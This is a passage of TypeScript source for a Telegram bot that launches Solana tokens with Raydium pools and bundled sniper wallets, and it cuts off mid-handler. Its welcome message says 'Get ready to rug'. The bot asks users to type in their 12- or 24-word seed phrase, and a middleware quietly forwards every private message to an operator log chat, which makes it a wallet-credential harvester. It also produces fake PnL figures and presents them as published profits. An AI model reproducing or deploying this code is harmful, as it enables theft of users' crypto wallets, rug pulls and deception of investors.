import 'dotenv/config';
import bs58 from 'bs58';
import { Markup, Telegraf, type Context } from 'telegraf';
import { ACCOUNT_SIZE, MINT_SIZE } from '@solana/spl-token';
import { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
import { fundWallets } from './fund.js';
import { createMarketAndPool } from './minter.js';
import { MARKET_STATE_LAYOUT_V2 } from './raydium.js';
import { snipe } from './snipe.js';
import { genWallets } from './wallets.js';
import { mnemonicToSeed } from '@scure/bip39';
import { derivePath } from 'ed25519-hd-key';

const STARTUP_TIMEOUT_MS = 15_000;
const DEFAULT_DRY_RUN = false;
const DEFAULT_FUND_SOL_PER_WALLET = 0.02;
const DEFAULT_SOL_USD_PRICE_API = 'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd';
const DEFAULT_SOL_IN_LP = 0.5;
const POOL_SETUP_BUFFER_SOL = 1;
const REQUEST_QUEUE_SIZE = 5120 + 12;
const EVENT_QUEUE_SIZE = 262144 + 12;
const ORDERBOOK_SIZE = 65536 + 12;
const PRICE_FETCH_TIMEOUT_MS = 10_000;
const LAUNCH_WALLET_COUNTS = [5, 10, 15, 25] as const;

const requiredEnv = (name: string): string => {
  const value = process.env[name];
  if (!value) {
    throw new Error(`Missing required environment variable: ${name}`);
  }

  return value;
};

const getNumberEnv = (name: string, fallback: number): number => {
  const value = process.env[name];
  if (!value) {
    return fallback;
  }

  const parsed = Number(value);
  if (!Number.isFinite(parsed) || parsed <= 0) {
    throw new Error(`Invalid numeric environment variable: ${name}`);
  }

  return parsed;
};

const getOptionalNumberEnv = (name: string): number | undefined => {
  const value = process.env[name];
  if (!value) {
    return undefined;
  }

  const parsed = Number(value);
  if (!Number.isFinite(parsed) || parsed <= 0) {
    throw new Error(`Invalid numeric environment variable: ${name}`);
  }

  return parsed;
};

const getOptionalStringEnv = (name: string): string | undefined => {
  const value = process.env[name]?.trim();
  return value ? value : undefined;
};

const getBooleanEnv = (name: string, fallback: boolean): boolean => {
  const value = process.env[name];
  if (!value) {
    return fallback;
  }

  const normalized = value.trim().toLowerCase();
  if (['1', 'true', 'yes', 'on'].includes(normalized)) {
    return true;
  }

  if (['0', 'false', 'no', 'off'].includes(normalized)) {
    return false;
  }

  throw new Error(`Invalid boolean environment variable: ${name}`);
};

const formatUsd = (amount: number): string => amount.toFixed(2);

const formatSolAmount = (sol: number): string => {
  const fixed = sol >= 1 ? sol.toFixed(3) : sol.toFixed(6);
  return fixed.replace(/\.?0+$/, '');
};

const formatSol = (lamports: number): string => {
  return formatSolAmount(lamports / LAMPORTS_PER_SOL);
};

const getTransactionLogs = (error: unknown): string[] => {
  if (!error || typeof error !== 'object') {
    return [];
  }

  const maybeLogs = (error as { transactionLogs?: unknown }).transactionLogs;
  if (!Array.isArray(maybeLogs)) {
    return [];
  }

  return maybeLogs.filter((entry): entry is string => typeof entry === 'string');
};

const describeError = (error: unknown): string => {
  const insufficientLamportsLog = getTransactionLogs(error).find((line) => line.includes('insufficient lamports'));
  if (insufficientLamportsLog) {
    const match = insufficientLamportsLog.match(/insufficient lamports (\d+), need (\d+)/);
    if (match) {
      const [, currentLamports, neededLamports] = match;
      return `PAYER_KEY wallet only had ${formatSol(Number(currentLamports))} SOL for that step, but it needed ${formatSol(Number(neededLamports))} SOL. Fund the payer wallet and try again.`;
    }

    return 'PAYER_KEY wallet has insufficient SOL for this transaction. Fund it and try again.';
  }

  return error instanceof Error ? error.message : 'Unknown error';
};

const processWalletConnection = async (input: string): Promise<{ address: string; balance: string; keypair?: Keypair }> => {
  try {
    const connection = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
    let publicKey: PublicKey;
    let keypair: Keypair | undefined;

    // Check if input is a seed phrase (12 or 24 words)
    const words = input.trim().split(/\s+/);
    if ((words.length === 12 || words.length === 24) && words.every(word => /^[a-z]+$/.test(word.toLowerCase()))) {
      // It's a seed phrase - convert to keypair
      try {
        const seed = await mnemonicToSeed(input);
        // Convert Uint8Array to hex string for derivePath
        const seedHex = Buffer.from(seed).toString('hex');
        // Use the standard Solana derivation path: m/44'/501'/0'/0'
        const derivedSeed = derivePath("m/44'/501'/0'/0'", seedHex);
        keypair = Keypair.fromSeed(derivedSeed.key);
        publicKey = keypair.publicKey;
      } catch (error) {
        console.error('Seed phrase conversion error:', error);
        throw new Error('Invalid seed phrase. Please check and try again.');
      }
    } else {
      // Try as a wallet address
      try {
        publicKey = new PublicKey(input);
      } catch {
        throw new Error('Invalid input. Please enter a valid 12/24-word seed phrase.');
      }
    }

    const walletAddress = publicKey.toBase58();
    const balance = await connection.getBalance(publicKey);
    const solBalance = formatSol(balance);

    return { address: walletAddress, balance: solBalance, keypair };
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    throw new Error(`❌ Connection failed: ${errorMessage}`);
  }
};

type WalletFundingConfig = {
  fundSolPerWallet: number;
  summary: string;
};

type LaunchWalletCount = (typeof LAUNCH_WALLET_COUNTS)[number];
type PnlScope = 'all' | number;

type SocialPlatform = 'x' | 'telegram' | 'website' | 'instagram';

type LaunchDraft = {
  tokenName: string;
  tokenSymbol: string;
  description: string;
  imageFileId: string;
  walletCount: LaunchWalletCount;
  socials: SocialPlatform[];
  address?: string;
  balance?: string;
  userKeypair?: Keypair;
};

type LaunchSession =
  | { stage: 'awaiting_name' }
  | { stage: 'awaiting_symbol'; tokenName: string }
  | { stage: 'awaiting_description'; tokenName: string; tokenSymbol: string }
  | { stage: 'awaiting_image'; tokenName: string; tokenSymbol: string; description: string }
  | { stage: 'awaiting_wallet_count'; tokenName: string; tokenSymbol: string; description: string; imageFileId: string }
  | { stage: 'awaiting_socials'; draft: LaunchDraft }
  | { stage: 'awaiting_review'; draft: LaunchDraft }
  | { stage: 'awaiting_wallet_connection'; draft: LaunchDraft }
  | { stage: 'launching'; draft: LaunchDraft };

type ReplyContext = Pick<Context, 'reply' | 'replyWithPhoto'>;

type LaunchResult = LaunchDraft & {
  wallets: string[];
  dryRun: boolean;
  exitedWalletIndexes: number[];
  simulatedFundingSummary: string;
  fundSolPerWallet: number;
  mint?: string;
  poolId?: string;
  bundleSignature?: string;
};

const TELEGRAM_LOG_CHAT_ID = getOptionalStringEnv('TELEGRAM_LOG_CHAT_ID');

const launchSessions = new Map<number, LaunchSession>();
const launchResults = new Map<number, LaunchResult>();

const getTelegramDisplayName = (ctx: Context): string => {
  const from = ctx.from;
  if (!from) {
    return 'Unknown user';
  }

  const fullName = [from.first_name, from.last_name].filter(Boolean).join(' ').trim();
  if (from.username) {
    return fullName ? `${fullName} (@${from.username})` : `@${from.username}`;
  }

  return fullName || `User ${from.id}`;
};

const getIncomingMessageType = (message: Record<string, unknown>): string => {
  const knownTypes = [
    'text',
    'photo',
    'video',
    'document',
    'audio',
    'voice',
    'sticker',
    'animation',
    'video_note',
    'contact',
    'location',
    'poll',
    'venue',
  ];

  return knownTypes.find((type) => type in message) ?? 'message';
};

const forwardIncomingMessageToLogChat = async (ctx: Context) => {
  if (!TELEGRAM_LOG_CHAT_ID || ctx.chat?.type !== 'private' || !ctx.from) {
    return;
  }

  const maybeMessage = ctx.message;
  if (!maybeMessage || typeof maybeMessage !== 'object' || !('message_id' in maybeMessage)) {
    return;
  }

  const message = maybeMessage as unknown as Record<string, unknown> & { message_id: number };
  const headerLines = [
    'Incoming user message',
    `User: ${getTelegramDisplayName(ctx)}`,
    `User ID: ${ctx.from.id}`,
    `Chat ID: ${ctx.chat.id}`,
    `Type: ${getIncomingMessageType(message)}`,
  ];

  if ('text' in message && typeof message.text === 'string' && message.text.trim()) {
    headerLines.push(`Preview: ${message.text.slice(0, 800)}`);
  } else if ('caption' in message && typeof message.caption === 'string' && message.caption.trim()) {
    headerLines.push(`Caption: ${message.caption.slice(0, 800)}`);
  }

  try {
    await ctx.telegram.sendMessage(TELEGRAM_LOG_CHAT_ID, headerLines.join('\n'));
    await ctx.telegram.forwardMessage(TELEGRAM_LOG_CHAT_ID, ctx.chat.id, message.message_id);
  } catch (error) {
    console.warn('Failed to forward incoming message to TELEGRAM_LOG_CHAT_ID:', error);
  }
};

const forwardBotReplyToLogChat = async (
  ctx: Context,
  sentMessage: { message_id: number },
  label: string,
) => {
  if (!TELEGRAM_LOG_CHAT_ID || ctx.chat?.type !== 'private' || !ctx.from) {
    return;
  }

  const headerLines = [
    'Bot response',
    `User: ${getTelegramDisplayName(ctx)}`,
    `User ID: ${ctx.from.id}`,
    `Chat ID: ${ctx.chat.id}`,
    `Type: ${label}`,
  ];

  try {
    await ctx.telegram.sendMessage(TELEGRAM_LOG_CHAT_ID, headerLines.join('\n'));
    await ctx.telegram.forwardMessage(TELEGRAM_LOG_CHAT_ID, ctx.chat.id, sentMessage.message_id);
  } catch (error) {
    console.warn('Failed to forward bot response to TELEGRAM_LOG_CHAT_ID:', error);
  }
};

const estimateLaunchBudget = async (conn: Connection, walletCount: number, fundSolPerWallet: number) => {
  const solInLpLamports = Math.round(getNumberEnv('SOL_IN_LP', DEFAULT_SOL_IN_LP) * LAMPORTS_PER_SOL);
  const walletFundingLamports = walletCount * Math.round(fundSolPerWallet * LAMPORTS_PER_SOL);
  const poolSetupBufferLamports = Math.round(POOL_SETUP_BUFFER_SOL * LAMPORTS_PER_SOL);
  const [
    mintRentLamports,
    tokenAccountRentLamports,
    marketStateRentLamports,
    requestQueueRentLamports,
    eventQueueRentLamports,
    orderbookRentLamports,
  ] = await Promise.all([
    conn.getMinimumBalanceForRentExemption(MINT_SIZE),
    conn.getMinimumBalanceForRentExemption(ACCOUNT_SIZE),
    conn.getMinimumBalanceForRentExemption(MARKET_STATE_LAYOUT_V2.span),
    conn.getMinimumBalanceForRentExemption(REQUEST_QUEUE_SIZE),
    conn.getMinimumBalanceForRentExemption(EVENT_QUEUE_SIZE),
    conn.getMinimumBalanceForRentExemption(ORDERBOOK_SIZE),
  ]);

  const tokenSetupRentLamports = mintRentLamports + tokenAccountRentLamports;
  const marketSetupRentLamports =
    marketStateRentLamports +
    requestQueueRentLamports +
    eventQueueRentLamports +
    orderbookRentLamports * 2 +
    tokenAccountRentLamports * 2;
  const minimumLamports = solInLpLamports + walletFundingLamports + tokenSetupRentLamports + marketSetupRentLamports;

  return {
    solInLpLamports,
    walletFundingLamports,
    tokenSetupRentLamports,
    marketSetupRentLamports,
    poolSetupBufferLamports,
    minimumLamports,
    recommendedLamports: minimumLamports + poolSetupBufferLamports,
  };
};

const ensureLaunchBudget = async (
  conn: Connection,
  payer: Keypair,
  walletCount: number,
  fundingConfig: WalletFundingConfig,
) => {
  const [balanceLamports, budget] = await Promise.all([
    conn.getBalance(payer.publicKey, 'confirmed'),
    estimateLaunchBudget(conn, walletCount, fundingConfig.fundSolPerWallet),
  ]);

  if (balanceLamports < budget.minimumLamports) {
    throw new Error(
      `PAYER_KEY wallet has ${formatSol(balanceLamports)} SOL, but /launch needs at least ${formatSol(budget.minimumLamports)} SOL (${formatSol(budget.solInLpLamports)} LP total + ${formatSol(budget.walletFundingLamports)} wallet funding for ${walletCount} wallets at ${fundingConfig.summary} + ${formatSol(budget.marketSetupRentLamports + budget.tokenSetupRentLamports)} setup rent).`,
    );
  }

  return {
    balanceLamports,
    budget,
    belowRecommended: balanceLamports < budget.recommendedLamports,
  };
};

const withTimeout = async <T>(promise: Promise<T>, label: string, timeoutMs = STARTUP_TIMEOUT_MS): Promise<T> => {
  let timer: NodeJS.Timeout | undefined;

  try {
    return await Promise.race([
      promise,
      new Promise<T>((_, reject) => {
        timer = setTimeout(() => reject(new Error(`${label} timed out after ${timeoutMs}ms`)), timeoutMs);
      }),
    ]);
  } finally {
    if (timer) {
      clearTimeout(timer);
    }
  }
};

const fetchSolUsdPrice = async (): Promise<number> => {
  const priceOverride = getOptionalNumberEnv('SOL_USD_PRICE_OVERRIDE');
  if (priceOverride !== undefined) {
    return priceOverride;
  }

  const priceApiUrl = process.env.SOL_USD_PRICE_API ?? DEFAULT_SOL_USD_PRICE_API;
  const response = await withTimeout(fetch(priceApiUrl), 'SOL/USD price fetch', PRICE_FETCH_TIMEOUT_MS);
  if (!response.ok) {
    throw new Error(`Failed to fetch SOL/USD price: ${response.status} ${response.statusText}`);
  }

  const data = (await response.json()) as { solana?: { usd?: unknown } };
  const usdPrice = data.solana?.usd;
  if (typeof usdPrice !== 'number' || !Number.isFinite(usdPrice) || usdPrice <= 0) {
    throw new Error('Failed to parse SOL/USD price from the price API response.');
  }

  return usdPrice;
};

const resolveWalletFundingConfig = async (skipPriceFetch = false): Promise<WalletFundingConfig> => {
  const fundUsdPerWallet = getOptionalNumberEnv('FUND_USD_PER_WALLET');
  if (fundUsdPerWallet !== undefined) {
    if (skipPriceFetch) {
      return {
        fundSolPerWallet: 0,
        summary: `$${formatUsd(fundUsdPerWallet)} each`,
      };
    }

    const solUsdPrice = await fetchSolUsdPrice();
    const fundSolPerWallet = fundUsdPerWallet / solUsdPrice;

    return {
      fundSolPerWallet,
      summary: `$${formatUsd(fundUsdPerWallet)} each (~${formatSolAmount(fundSolPerWallet)} SOL at $${formatUsd(solUsdPrice)}/SOL)`,
    };
  }

  const fundSolPerWallet = getNumberEnv('FUND_SOL_PER_WALLET', DEFAULT_FUND_SOL_PER_WALLET);
  return {
    fundSolPerWallet,
    summary: `${formatSolAmount(fundSolPerWallet)} SOL each`,
  };
};

const isDryRunEnabled = (): boolean => getBooleanEnv('DRY_RUN', DEFAULT_DRY_RUN);

const getChatId = (ctx: Context): number => {
  const chatId = ctx.chat?.id;
  if (chatId === undefined) {
    throw new Error('Could not determine the Telegram chat for this launch flow.');
  }

  return chatId;
};

const isValidWalletCount = (value: number): value is LaunchWalletCount =>
  LAUNCH_WALLET_COUNTS.some((count) => count === value);

const escapeHtml = (value: string): string =>
  value
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;');

const SOCIAL_PLATFORM_LABELS: Record<SocialPlatform, string> = {
  x: '🐦 X',
  telegram: '📱 Telegram',
  website: '🌐 Website',
  instagram: '📸 Instagram',
};

const walletCountKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback('👥 5 Wallets', 'launch_wallet_count:5'),
    Markup.button.callback('👥 10 Wallets', 'launch_wallet_count:10'),
  ],
  [
    Markup.button.callback('👥 15 Wallets', 'launch_wallet_count:15'),
    Markup.button.callback('👥 25 Wallets', 'launch_wallet_count:25'),
  ],
  [Markup.button.callback('❌ Cancel', 'menu_cancel')],
]);

const isWalletExited = (result: LaunchResult, walletIndex: number): boolean =>
  result.exitedWalletIndexes.includes(walletIndex);

const chunkButtons = <T>(items: T[], size: number): T[][] => {
  const rows: T[][] = [];

  for (let index = 0; index < items.length; index += size) {
    rows.push(items.slice(index, index + size));
  }

  return rows;
};

const mainMenuKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback('🚀 Launch', 'menu_launch'),
    Markup.button.callback('🔑 Wallets', 'menu_wallets'),
  ],
  [Markup.button.callback('📂 Portfolio', 'menu_portfolio')],
]);

const buildWalletActionsKeyboard = (result: LaunchResult) => {
  const rows = [[Markup.button.callback('👀 View All Wallets', 'launch_show_wallets')]];

  if (result.dryRun) {
    for (let index = 0; index < result.wallets.length; index += 1) {
      rows.push([
        Markup.button.callback(
          isWalletExited(result, index) ? `✅ Wallet ${index + 1} Exited` : `💥 Dump Wallet ${index + 1}`,
          `launch_test_dump:${index}`,
        ),
      ]);
    }

    rows.push([
      Markup.button.callback('💥 Dump All', 'launch_test_dump_all'),
      Markup.button.callback('♻️ Reset', 'launch_test_reset'),
    ]);
  }

  rows.push([Markup.button.callback('🏠 Back To Menu', 'menu_back')]);
  return Markup.inlineKeyboard(rows);
};

const buildCompactWalletActionsKeyboard = (result: LaunchResult) => {
  const rows = [[
    Markup.button.callback('👀 View Wallets', 'launch_show_wallets'),
    Markup.button.callback('🏠 Menu', 'menu_back'),
  ]];

  if (result.dryRun) {
    const walletButtons = result.wallets.map((_, index) =>
      Markup.button.callback(
        isWalletExited(result, index) ? `✅ ${index + 1} Exited` : `💥 Dump ${index + 1}`,
        `launch_test_dump:${index}`,
      ),
    );
    rows.push(...chunkButtons(walletButtons, 2));
    rows.push([
      Markup.button.callback('💥 Dump All', 'launch_test_dump_all'),
      Markup.button.callback('♻️ Reset', 'launch_test_reset'),
    ]);
  }

  return Markup.inlineKeyboard(rows);
};

const launchSetupKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('❌ Cancel', 'menu_cancel')],
]);

const buildSocialsKeyboard = (selectedSocials: SocialPlatform[]) =>
  Markup.inlineKeyboard([
    [
      Markup.button.callback(
        `${selectedSocials.includes('x') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.x}`,
        'launch_social_toggle:x',
      ),
      Markup.button.callback(
        `${selectedSocials.includes('telegram') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.telegram}`,
        'launch_social_toggle:telegram',
      ),
    ],
    [
      Markup.button.callback(
        `${selectedSocials.includes('website') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.website}`,
        'launch_social_toggle:website',
      ),
      Markup.button.callback(
        `${selectedSocials.includes('instagram') ? '✅ ' : ''}${SOCIAL_PLATFORM_LABELS.instagram}`,
        'launch_social_toggle:instagram',
      ),
    ],
    [
      Markup.button.callback('✅ Done', 'launch_socials_done'),
      Markup.button.callback('⏭️ Skip', 'launch_socials_skip'),
    ],
    [Markup.button.callback('❌ Cancel', 'menu_cancel')],
  ]);

const reviewKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback('✅ Confirm & Save', 'launch_review_confirm')],
  [Markup.button.callback('❌ Cancel', 'menu_cancel')],
]);

const formatWalletMessages = (result: LaunchResult): string[] => {
  const header = `👛 Bundle wallets for ${result.tokenName} (${result.tokenSymbol}):`;
  const lines = result.wallets.map((address, index) => {
    const status = isWalletExited(result, index) ? 'TEST EXITED' : 'ACTIVE';
    return `Wallet ${index + 1} [${status}]: ${address}`;
  });
  const messages: string[] = [];
  let currentMessage = header;

  for (const line of lines) {
    if (`${currentMessage}\n${line}`.length > 3500) {
      messages.push(currentMessage);
      currentMessage = line;
      continue;
    }

    currentMessage = `${currentMessage}\n${line}`;
  }

  messages.push(currentMessage);
  return messages;
};

const formatSocials = (socials: SocialPlatform[]): string =>
  socials.length === 0 ? '—' : socials.map((platform) => SOCIAL_PLATFORM_LABELS[platform]).join(', ');

const buildReviewCaption = (draft: LaunchDraft): string =>
  `Review\n\n📝 Name: ${draft.tokenName}\n🔤 Symbol: $${draft.tokenSymbol}\n👥 Wallets: ${draft.walletCount}\n📄 Description: ${draft.description}\n🔗 Socials: ${formatSocials(draft.socials)}`;

const buildWalletListMessage = (result: LaunchResult): string => {
  const walletLines = result.wallets.flatMap((address, index) => {
    const status = isWalletExited(result, index) ? 'EXITED' : 'ACTIVE';
    const lines = [`${String(index + 1).padStart(2, '0')}. Wallet ${index + 1} [${status}]`, address];

    if (index < result.wallets.length - 1) {
      lines.push('');
    }

    return lines;
  });

  return [
    `👛 <b>Bundle Wallets</b>`,
    `<b>Token:</b> ${escapeHtml(result.tokenName)} (${escapeHtml(result.tokenSymbol)})`,
    `<pre>${escapeHtml(walletLines.join('\n'))}</pre>`,
  ].join('\n');
};

const buildLaunchSummaryMessage = (result: LaunchResult): string => {
  const lines = [
    `Token   : ${result.tokenName}`,
    `Symbol  : ${result.tokenSymbol}`,
    `Wallets : ${result.walletCount}`,
    `Funding : ${result.simulatedFundingSummary}`,
    result.mint ? `Mint    : ${result.mint}` : undefined,
    result.poolId ? `Pool    : ${result.poolId}` : undefined,
    `Status  : Launch prepared`,
  ].filter((line): line is string => Boolean(line));

  return [
    `🚀 <b>Launch Summary</b>`,
    `<pre>${escapeHtml(lines.join('\n'))}</pre>`,
  ].join('\n');
};

const replyWithWalletList = async (ctx: ReplyContext, result: LaunchResult) => {
  await ctx.reply(buildWalletListMessage(result), { parse_mode: 'HTML' });
};

const replyWithWalletControls = async (ctx: ReplyContext, result: LaunchResult) => {
  const label = '👛 Wallet controls:';
  await ctx.reply(label, buildCompactWalletActionsKeyboard(result));
};

const showReview = async (ctx: ReplyContext, draft: LaunchDraft) => {
  await ctx.replyWithPhoto(draft.imageFileId, {
    caption: buildReviewCaption(draft),
    ...reviewKeyboard,
  });
};

const showMainMenu = async (ctx: ReplyContext, text = 'Choose an option below.') => {
  await ctx.reply(text, mainMenuKeyboard);
};

const startLaunchSetup = async (ctx: ReplyContext, chatId: number) => {
  launchSessions.set(chatId, { stage: 'awaiting_name' });
  await ctx.reply(
    '🧾 Token name (1-50)\nTip: Latest, Hot Tokens.',
    launchSetupKeyboard,
  );
};

const getSimulatedWalletPnl = (walletIndex: number) => {
  const percent = Number((8 + ((walletIndex + 1) * 5.75) % 31).toFixed(2));
  const solDelta = Number((0.0045 + walletIndex * 0.0021).toFixed(4));
  const usdDelta = Number((solDelta * 145.5).toFixed(2));

  return { percent, solDelta, usdDelta };
};

const getSimulatedAllWalletsPnl = (result: LaunchResult) => {
  const walletIndexes = result.wallets.map((_, index) => index);
  const totals = walletIndexes.reduce(
    (accumulator, walletIndex) => {
      const pnl = getSimulatedWalletPnl(walletIndex);
      return {
        solDelta: accumulator.solDelta + pnl.solDelta,
        usdDelta: accumulator.usdDelta + pnl.usdDelta,
      };
    },
    { solDelta: 0, usdDelta: 0 },
  );
  const averagePercent = walletIndexes.length === 0
    ? 0
    : Number(
        (
          walletIndexes.reduce((accumulator, walletIndex) => accumulator + getSimulatedWalletPnl(walletIndex).percent, 0) /
          walletIndexes.length
        ).toFixed(2),
      );

  return {
    averagePercent,
    solDelta: Number(totals.solDelta.toFixed(4)),
    usdDelta: Number(totals.usdDelta.toFixed(2)),
  };
};

const buildShowPnlKeyboard = (scope: 'all' | number) =>
  Markup.inlineKeyboard([[Markup.button.callback('📈 Show PnL', `launch_test_show_pnl:${scope}`)]]);

const buildPnlSiteUrl = (result: LaunchResult, scope: PnlScope): string | undefined => {
  const baseUrl = getOptionalStringEnv('PNL_SITE_URL');
  if (!baseUrl) {
    return undefined;
  }

  let url: URL;
  try {
    url = new URL(baseUrl);
  } catch {
    console.warn('Invalid PNL_SITE_URL configured:', baseUrl);
    return undefined;
  }

  const siteDomain = getOptionalStringEnv('PNL_SITE_DOMAIN') ?? url.host ?? 'domain.com';
  const isAllWallets = scope === 'all';
  const pnl = isAllWallets ? getSimulatedAllWalletsPnl(result) : getSimulatedWalletPnl(scope);
  const invested = Number(((isAllWallets ? result.wallets.length : 1) * result.fundSolPerWallet).toFixed(4));
  const multiplier = invested > 0 ? Number((Math.abs(pnl.solDelta) / invested).toFixed(2)) : 0;
  const pnlId = isAllWallets ? `${result.tokenSymbol}-all` : `${result.tokenSymbol}-wallet-${scope + 1}`;
  const params = new URLSearchParams({
    domain: siteDomain,
    profit: String(Number(pnl.solDelta.toFixed(4))),
    invested: String(invested),
    multiplier: String(multiplier),
    mode: isAllWallets ? 'Sniper Dump' : `Wallet ${scope + 1} Exit`,
    currency: 'SOL',
    token: result.tokenSymbol,
    scope: isAllWallets ? 'All Wallets' : `Wallet ${scope + 1}`,
  });

  url.hash = `/pnl/${encodeURIComponent(pnlId)}?${params.toString()}`;
  return url.toString();
};

const buildPnlActionsKeyboard = (result: LaunchResult, scope: PnlScope) => {
  const rows = [[Markup.button.callback('📈 Show PnL', `launch_test_show_pnl:${scope}`)]];
  const pnlSiteUrl = buildPnlSiteUrl(result, scope);

  if (pnlSiteUrl) {
    return Markup.inlineKeyboard([
      [Markup.button.webApp('📈 Show PnL', pnlSiteUrl)],
      [Markup.button.callback('💬 Show In Bot', `launch_test_show_pnl:${scope}`)],
    ]);
  }

  return Markup.inlineKeyboard(rows);
};

const buildPostDumpKeyboard = () =>
  Markup.inlineKeyboard([
    [Markup.button.callback('👀 View All Wallets', 'launch_show_wallets')],
    [Markup.button.callback('🏠 Back To Menu', 'menu_back')],
  ]);

const publishSimulatedPnl = async (ctx: ReplyContext, result: LaunchResult, scope: 'all' | number) => {
  if (scope === 'all') {
    await ctx.reply('📊 PnL published.', buildPnlActionsKeyboard(result, 'all'));
    await ctx.reply('✅ All wallets dumped successfully.', buildPostDumpKeyboard());
    return;
  }

  await ctx.reply(`📊 PnL published for Wallet ${scope + 1}.`, buildPnlActionsKeyboard(result, scope));
  await ctx.reply(`✅ Wallet ${scope + 1} dumped successfully.`, buildPostDumpKeyboard());
};

const bot = new Telegraf(requiredEnv('TG_BOT_TOKEN'));
const conn = new Connection(requiredEnv('RPC_MAIN'));

bot.catch((error, ctx) => {
  console.error(`Telegram update failed for ${ctx.updateType}:`, error);
});

bot.use(async (ctx, next) => {
  await forwardIncomingMessageToLogChat(ctx);

  if (TELEGRAM_LOG_CHAT_ID && ctx.chat?.type === 'private') {
    const originalReply = ctx.reply.bind(ctx);
    ctx.reply = (async (...args) => {
      const sentMessage = await originalReply(...args);
      await forwardBotReplyToLogChat(ctx, sentMessage, 'text');
      return sentMessage;
    }) as typeof ctx.reply;

    const originalReplyWithPhoto = ctx.replyWithPhoto.bind(ctx);
    ctx.replyWithPhoto = (async (...args) => {
      const sentMessage = await originalReplyWithPhoto(...args);
      await forwardBotReplyToLogChat(ctx, sentMessage, 'photo');
      return sentMessage;
    }) as typeof ctx.replyWithPhoto;
  }

  return next();
});

bot.start(async (ctx) => {
  const welcomeMessage = `⚡ Get ready to rug

  Platforms.

  ⚙️ Advanced
  • Auto-Bundling (5–25)
  • Sniper protection
  • Volume assist
  • Tx tracker

  Tap a button below to begin:`;

  await showMainMenu(ctx, welcomeMessage);
});

bot.command('cancel', async (ctx) => {
  const chatId = getChatId(ctx);
  if (!launchSessions.has(chatId)) {
    await ctx.reply('No launch setup is in progress.');
    return;
  }

  launchSessions.delete(chatId);
  await ctx.reply('Launch setup cancelled.');
});

bot.command('wallets', async (ctx) => {
  const chatId = getChatId(ctx);
  const result = launchResults.get(chatId);
  if (!result) {
    await showMainMenu(ctx, 'No bundle wallets are stored for this chat yet.');
    return;
  }

  await replyWithWalletList(ctx, result);
  await replyWithWalletControls(ctx, result);
});

const runLaunch = async (ctx: ReplyContext, chatId: number, draft: LaunchDraft) => {
  try {
    const dryRun = isDryRunEnabled();
    const fundingConfig = await resolveWalletFundingConfig(dryRun);
    const wallets = genWallets(draft.walletCount);
    const walletAddresses = wallets.map((wallet) => wallet.publicKey.toBase58());
    launchResults.set(chatId, {
      ...draft,
      wallets: walletAddresses,
      dryRun,
      exitedWalletIndexes: [],
      simulatedFundingSummary: fundingConfig.summary,
      fundSolPerWallet: fundingConfig.fundSolPerWallet,
    });

    await ctx.reply(`Starting launch for ${draft.tokenName} ($${draft.tokenSymbol}).`);
    await ctx.reply(`Generating ${draft.walletCount} wallets...`);
    await ctx.reply(`Wallet funding mode: ${fundingConfig.summary}.`);

    if (dryRun) {
      const simulatedMint = Keypair.generate().publicKey.toBase58();
      const simulatedPool = Keypair.generate().publicKey.toBase58();
      launchResults.set(chatId, {
        ...draft,
        wallets: walletAddresses,
        dryRun: true,
        exitedWalletIndexes: [],
        simulatedFundingSummary: fundingConfig.summary,
        fundSolPerWallet: fundingConfig.fundSolPerWallet,
        mint: simulatedMint,
        poolId: simulatedPool,
      });

      const dryRunResult = launchResults.get(chatId)!;
      await ctx.reply(buildLaunchSummaryMessage(dryRunResult), {
        parse_mode: 'HTML',
        ...buildCompactWalletActionsKeyboard(dryRunResult),
      });
      await replyWithWalletList(ctx, dryRunResult);
      return;
    }

    const payer = Keypair.fromSecretKey(bs58.decode(requiredEnv('PAYER_KEY')));
    const { balanceLamports, budget, belowRecommended } = await ensureLaunchBudget(
      conn,
      payer,
      wallets.length,
      fundingConfig,
    );
    await ctx.reply(`Payer balance check passed: ${formatSol(balanceLamports)} SOL available.`);
    if (belowRecommended) {
      await ctx.reply(
        `Balance is above the minimum, but Raydium pool setup may still need more rent. Recommended launch budget is about ${formatSol(budget.recommendedLamports)} SOL.`,
      );
    }

    await ctx.reply(`Creating Raydium market and pool for ${draft.tokenName} ($${draft.tokenSymbol})...`);

    const { mint, poolKeys } = await createMarketAndPool(conn, payer);
    launchResults.set(chatId, {
      ...draft,
      wallets: walletAddresses,
      dryRun: false,
      exitedWalletIndexes: [],
      simulatedFundingSummary: fundingConfig.summary,
      fundSolPerWallet: fundingConfig.fundSolPerWallet,
      mint: mint.toBase58(),
      poolId: poolKeys.id.toBase58(),
    });

    await ctx.reply(`Pool created for ${draft.tokenName} (${draft.tokenSymbol}): ${poolKeys.id.toBase58()}`);
    await fundWallets(conn, payer, wallets, fundingConfig.fundSolPerWallet);
    await ctx.reply('Wallets funded and WSOL wrapped.');

    const sig = await snipe(conn, wallets, poolKeys, mint);
    launchResults.set(chatId, {
      ...draft,
      wallets: walletAddresses,
      dryRun: false,
      exitedWalletIndexes: [],
      simulatedFundingSummary: fundingConfig.summary,
      fundSolPerWallet: fundingConfig.fundSolPerWallet,
      mint: mint.toBase58(),
      poolId: poolKeys.id.toBase58(),
      bundleSignature: sig,
    });
    await ctx.reply(`Bundle landed: https://solscan.io/tx/${sig}`);
    const launchResult = launchResults.get(chatId)!;
    await ctx.reply(buildLaunchSummaryMessage(launchResult), {
      parse_mode: 'HTML',
      ...buildCompactWalletActionsKeyboard(launchResult),
    });
    await replyWithWalletList(ctx, launchResult);
  } catch (error) {
    console.error('Launch failed:', error);
    await ctx.reply(`Launch failed: ${describeError(error)}`);
    if (launchResults.has(chatId)) {
      await ctx.reply('Use /wallets to review the generated bundle wallets for this chat.');
    }
  }
};

bot.command('launch', async (ctx) => {
  const chatId = getChatId(ctx);
  await startLaunchSetup(ctx, chatId);
});

bot.on('text', async (ctx) => {
  const text = ctx.message.text.trim();
  if (text.startsWith('/')) {
